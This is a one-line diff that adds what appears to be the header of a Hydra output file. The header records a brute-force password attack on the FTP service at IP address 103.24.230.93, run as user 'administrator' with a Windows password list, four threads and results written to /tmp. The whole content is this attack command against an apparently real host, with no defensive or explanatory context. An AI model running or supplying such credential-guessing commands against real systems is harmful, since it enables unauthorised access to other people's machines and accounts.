@@ -1,0 +1,1 @@
+# Hydra v9.2 run at 2026-07-28 07:05:18 on 103.24.230.93 ftp (hydra -l administrator -P /tmp/win_pass.txt -t 4 -w 3 -o /tmp/fastftp.txt ftp://103.24.230.93)
